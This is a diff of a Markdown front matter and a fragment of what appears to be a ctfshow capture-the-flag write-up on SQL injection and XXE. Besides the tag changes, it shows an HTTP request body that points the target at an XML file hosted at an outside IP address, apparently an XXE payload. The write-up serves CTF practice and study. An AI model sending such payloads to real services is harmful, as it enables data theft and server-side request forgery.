@@ -6,8 +6,8 @@ date: "2024-12-12T20:53:52"
 lastmod: "2024-12-12T20:53:52"
 image: ""
 license: ""
-categories: ["ctfshow"]
-tags: ["mysql", "php", "xxe"]
+categories: ["赛题"]
+tags: ["ctfshow", "SQL注入", "XXE"]
 ---
 ## 签到_观己
 
@@ -300,4 +300,3 @@ Connection: close
 
 api=http%3A%2F%2F156.238.233.9%2Fb.xml&city=1
 ```
-
